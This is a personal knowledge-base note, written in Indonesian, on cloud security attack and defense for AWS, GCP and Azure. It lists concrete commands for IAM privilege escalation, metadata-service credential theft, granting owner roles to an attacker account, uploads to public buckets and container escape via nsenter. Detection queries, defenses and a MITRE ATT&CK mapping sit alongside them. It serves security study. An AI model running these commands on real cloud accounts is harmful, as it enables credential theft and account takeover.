---
title: 'Cloud Native Security: AWS, GCP, Azure — Attack & Defense'
tags:
- cloud-security
- aws
- gcp
- azure
- iam
- container-security
- metadata-service
- cloud-pentest
- cloud-defense
aliases:
- Cloud Security Deep-Dive
- AWS GCP Azure Pentest
- Cloud Native Attack & Defense
- Cloud IAM Abuse
created: 2026-07-23
updated: 2026-07-23
status: pending
cssclasses:
  - wide-table
---

# Cloud Native Security: AWS, GCP, Azure — Attack & Defense

> [!tip] Cloud security berbeda fundamentally dengan on-premise: **kamu tidak memiliki network atau hardware** — semuanya API-driven. Attack surface utama bukan IP atau port, melainkan **IAM policies, metadata service, dan misconfiguration**. Catatan ini mencakup attack path dari ketiga cloud provider besar, dari red team dan blue team perspective, dengan command konkret yang bisa diuji.

---

## Daftar Isi

1. [[#1. IAM Privilege Escalation]]
2. [[#2. Storage Service Misconfiguration]]
3. [[#3. Container Escape di Cloud Context]]
4. [[#4. Metadata Service Attack]]
5. [[#5. Logging & Detection]]
6. [[#6. MITRE ATT&CK Mapping]]
7. [[#Referensi]]
8. [[#Koneksi ke Vault]]

---

## 1. IAM Privilege Escalation

### 1.1 AWS IAM — AssumeRole, STS, PassRole

**Core problem:** IAM policies yang terlalu permisif (wildcard `*` pada resource atau action) memungkinkan privilege escalation.

**Attack vectors:**

| Teknik | Policy yang Dibutuhkan | Dampak |
|--------|----------------------|--------|
| PassRole ke EC2 | `iam:PassRole` + `ec2:RunInstances` | Instant admin access via EC2 dengan role tinggi |
| AssumeRole ke role lain | `sts:AssumeRole` pada target role | Akses ke role dengan privilege lebih tinggi |
| CreateAccessKey | `iam:CreateAccessKey` pada user lain | Persistence via access key user lain |
| UpdateAssumeRolePolicy | `iam:UpdateAssumeRolePolicy` | Ubah trust policy role untuk include akun attacker |

**Command uji (AWS CLI):**

```bash
# 1. PassRole attack — luncurkan EC2 dengan high-privilege role
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro \
  --iam-instance-profile Name=AdminRole \
  --user-data '#!/bin/bash
    aws sts get-caller-identity > /tmp/owned.txt
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole'

# 2. AssumeRole — escalate ke role lain
aws sts assume-role \
  --role-arn "arn:aws:iam::123456789012:role/TargetAdminRole" \
  --role-session-name "escalation"
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# 3. Detect dengan CloudTrail — filter PassRole events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=PassRole \
  --query 'Events[?contains(CloudTrailEvent, `"errorCode"`)]'
```

**Detection (GuardDuty & CloudTrail):**
- `PassRole` dari source IP yang tidak dikenal
- `AssumeRole` dengan `role-session-name` mencurigakan
- Role digunakan dari region yang tidak biasa

### 1.2 GCP IAM — Service Account Impersonation

**Core problem:** GCP Service Account memiliki OAuth scope yang bisa di-chain. Attack utama: **service account impersonation** via metadata atau direct API.

```bash
# 1. Dapatkan token dari metadata service (dalam GCE/GKE)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# 2. Impersonate service account
gcloud auth activate-service-account \
  attacker-sa@project.iam.gserviceaccount.com \
  --key-file=attacker-key.json

# 3. Create key untuk persistence
gcloud iam service-accounts keys create \
  --iam-account target-sa@project.iam.gserviceaccount.com \
  /tmp/owned-sa-key.json

# 4. Grant IAM policy ke external account
gcloud projects add-iam-policy-binding project-id \
  --member="user:attacker@gmail.com" \
  --role="roles/owner"
```

**Key detection (GCP Audit Logs):**
- `google.iam.admin.v1.CreateServiceAccountKey` — pembuatan key tidak biasa
- `google.iam.admin.v1.SetIamPolicy` — perubahan IAM drastis
- Token di-log di `principalEmail` field

### 1.3 Azure RBAC — Managed Identity Abuse

**Core problem:** Azure Managed Identity otomatis memberikan credential ke resource. Jika attacker punya akses ke resource (VM, App Service), dia bisa mendapatkan token Managed Identity.

```bash
# 1. Dapatkan Managed Identity token dari Azure VM IMDS
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 2. Gunakan token untuk akses ARM
export TOKEN=$(curl ...)
az login --identity --username /subscriptions/x/resourcegroups/y/providers/... 2>/dev/null

# 3. Azure AD privilege escalation — consent phish
# Attacker register aplikasi, minta admin consent ke Graph API
az ad app create --display-name "LegitApp"
az ad app permission grant --id $APP_ID --api 00000003-0000-0000-c000-000000000000

# 4. PIM (Privileged Identity Management) abuse — aktivasi role
az role assignment create \
  --assignee $USER_ID \
  --role "Contributor" \
  --scope /subscriptions/$SUB_ID
```

**Detection (Azure Monitor + Sentinel):**
- Anomalous `az login` dari IP asing
- Aktivasi PIM di luar jam kerja
- Managed identity token requests dari resource yang tidak dikenal

---

## 2. Storage Service Misconfiguration

### 2.1 AWS S3 — Bucket Enumeration & Exploitation

```bash
# 1. Enumeration bucket publik (tanpa auth)
aws s3 ls s3://target-bucket --no-sign-request 2>/dev/null
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# 2. Dicari pake grayhatwarfare/bucketstream
# Bucket stream — real-time monitoring bucket creation
bucketstream -v -k targetkeyword

# 3. Mass upload file
aws s3 cp malicious.txt s3://target-bucket/ --no-sign-request

# 4. Server-Side Request Forgery via S3 — forced auth
# Upload file dengan metadata berbahaya
aws s3api put-object \
  --bucket target-bucket \
  --key test.html \
  --body ./test.html \
  --metadata "x-amz-security-token=STOLEN_TOKEN"
```

**Defense:**
- Block public access via S3 Block Public Access (account-level)
- S3 Bucket Policy dengan explicit deny
- S3 Object Lambda untuk content inspection
- GuardDuty S3 Protection

### 2.2 GCP GCS — Bucket Misconfiguration

```bash
# 1. Test akses publik
gsutil ls gs://target-bucket

# 2. List objects tanpa auth
curl -X GET "https://storage.googleapis.com/storage/v1/b/target-bucket/o"

# 3. Upload jika ACL permisif
gsutil cp exploit.txt gs://target-bucket/

# 4. Buat signed URL untuk persistence
gsutil signurl -d 7d key.json gs://target-bucket/exploit.txt
```

**Defense:**
- Uniform vs Fine-grained ACL — pilih Uniform
- VPC Service Controls
- Data Loss Prevention API untuk scan content

### 2.3 Azure Blob — Anonymous Access

```bash
# 1. Test anonymous akses (allowBlobPublicAccess=true)
curl "https://targetstorage.blob.core.windows.net/container?restype=container&comp=list"

# 2. Shared Access Signature (SAS) brute — jika SAS token bocor
# Format: ?sv=2020-08-04&ss=b&srt=sco&sp=rwdl&se=...&sig=SIGNATURE

# 3. Azure Storage Explorer — GUI untuk enumerate
# storageexplorer connect dengan connection string
```

**Defense:**
- Disable anonymous access di storage account level
- Gunakan managed identity — jangan SAS
- Azure Defender for Storage

---

## 3. Container Escape di Cloud Context

### 3.1 AWS EKS — IAM Roles for Service Accounts (IRSA)

```bash
# 1. Dapatkan pod identity token
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# 2. Assume role via token
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789012:role/EKSAdminRole \
  --role-session-name eks-escalation \
  --web-identity-token $(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)

# 3. Jika IRSA terlalu ketat — escape via node role
# Dapatkan instance profile credential dari metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/NODE_ROLE_NAME
```

### 3.2 GKE — Workload Identity Abuse

```bash
# 1. Test Workload Identity binding
kubectl exec -it pod-name -- sh
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL/providers/PROVIDER"

# 2. Jika GKE cluster memiliki node with wide scopes
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"

# 3. Escape ke host node
kubectl get pods --all-namespaces
kubectl exec -it -n kube-system daemonset/container-engine ... -- chroot /host
```

### 3.3 AKS — aad-pod-identity Abuse

```bash
# 1. Dapatkan Managed Identity dari pod
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"

# 2. Jika pod punya akses ke host filesystem
kubectl exec -it pod-name -- cat /host/var/lib/azure/msi/tokens

# 3. Escape via privileged container
kubectl get pods -A -o wide | grep -i privileged
kubectl exec -it privileged-pod -- nsenter --target 1 --mount --uts --ipc --pid -- bash
```

---

## 4. Metadata Service Attack

### 4.1 AWS IMDS — IMDSv1 vs IMDSv2

```bash
# IMDSv1 (vulnerable) — SSRF langsung dapat credential
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 (defended) — butuh PUT token dulu
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF bypass IMDSv2 via AWS API
# Jika SSRF di APIGateway atau Lambda → IMDS via HTTP hop limit
```

### 4.2 GCP Metadata

```bash
# Metadata service (hanya dari GCE/GKE)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/"

# Endpoint kritis:
# - /instance/service-accounts/default/token → access token
# - /instance/service-accounts/default/identity
# - /project/attributes/ssh-keys → SSH key dari project
# - /instance/attributes/kube-env → GKE bootstrap rahasia

# SSRF ke metadata — bypass header requirement
# Beberapa aplikasi proxy/SSRF bisa di-bypass dengan:
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json"
```

### 4.3 Azure IMDS

```bash
# Managed Identity token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# Semua endpoint tersedia:
# /metadata/instance — informasi VM
# /metadata/identity — Managed Identity
# /metadata/scheduledevents — planned maintenance (useful for DoS detection)
```

---

## 5. Logging & Detection

### 5.1 AWS — CloudTrail, GuardDuty, Security Hub

```bash
# Cek apakah CloudTrail aktif
aws cloudtrail describe-trails --query 'trailList[?IsMultiRegionTrail]'
aws cloudtrail get-trail-status --name trail-name

# Query GuardDuty findings
aws guardduty list-findings --detector-id $(aws guardduty list-detectors --query DetectorIds[0])
aws guardduty get-findings --detector-id $DETECTOR_ID --finding-ids $FINDING_ID

# Filter IAM abuse events
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey
```

**Critical GuardDuty finding types:**
- `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`
- `PrivilegeEscalation:IAMUser/PassRole`
- `Recon:IAMUser/ResourcePermission`
- `Policy:S3/BucketPublicAccess`

### 5.2 GCP — Cloud Audit Logs, Security Command Center

```bash
# Filter audit logs untuk service account key creation
gcloud logging read 'protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"'

# Security Command Center — active findings
gcloud scc findings list $ORGANIZATION_ID \
  --category="MISCONFIGURATION"

# VPC Service Controls — detect exfiltration
gcloud access-context-manager perimeters list
```

### 5.3 Azure — Monitor, Sentinel, Defender for Cloud

```bash
# Log Analytics query — sign-in dari IP anomali
# KQL (Kusto Query Language):
# SigninLogs
# | where IPAddress !in (known_company_ips)
# | where ResultType == 0
# | project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName

# Defender for Cloud — active alerts
az security alert list --query "[?properties.status=='Active']"
```

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique ID | Nama | Cloud |
|--------|-------------|------|-------|
| Initial Access | T1199 | Trusted Relationship | AWS Cross-Account, GCP Org Policy |
| Defense Evasion | T1525 | Implant Internal Image | ECR/GCR/ACR registry poison |
| Discovery | T1526 | Cloud Service Discovery | AWS `ec2:DescribeInstances` |
| Privilege Escalation | T1548 | Abuse Elevation Control | IAM PassRole, GCP SA Impersonation |
| Credential Access | T1528 | Steal Application Access Token | Metadata Service (IMDS/IMDSv2) |
| Exfiltration | T1537 | Transfer Data to Cloud Account | S3/GCS/Azure Blob cross-account |
| Persistence | T1098 | Account Manipulation | CreateAccessKey, SA Key creation |

---

## Referensi

1.  Rhino Security Labs. *"AWS IAM Privilege Escalation — Methods and Mitigation."* (2023).
2.  Bishop Fox. *"GCP IAM Abuse: From Service Account to Domain Admin."* (2024).
3.  Microsoft Security. *"Azure Managed Identity Abuse Detection."* (2024).
4.  NCC Group. *"Metadata Service Attacks in Cloud Environments."* (2023).
5.  MITRE ATT&CK. *"Cloud Matrix — IAM, Storage, Container."* (2024).
6.  AWS Security Blog. *"How to use IMDSv2 to protect against SSRF."* (2023).
7.  GCP Security. *"Hardening GKE: Workload Identity and Metadata Concealment."* (2024).
8.  Azure Security. *"Defender for Cloud — Container Security."* (2024).
9.  Trail of Bits. *"Cloud Container Escape Techniques."* (2023).
10. SpecterOps. *"Cloud Pentest Methodology."* (2024).

---

## Koneksi ke Vault

| Catatan | Koneksi |
|---------|---------|
| [[homelab-security-architecture-synthesis]] | Arsitektur security on-prem — cloud sebagai ekstensi atau alternatif |
| [[container-kubernetes-security-deepdive]] | Container escape di cloud context — EKS, GKE, AKS |
| [[identity-and-access-management]] | IAM fundamental — cloud IAM adalah evolusi dari konsep RBAC |
| [[cloud-security-posture-management]] | CSPM tools — hubungan dengan detection via GuardDuty/SCC/Azure Defender |
| [[linux-hardening-cis]] | Hardening OS untuk cloud VM — CIS benchmark |
| [[infrastructure-administrator]] | Administrasi multi-platform — cloud sebagai managed service |
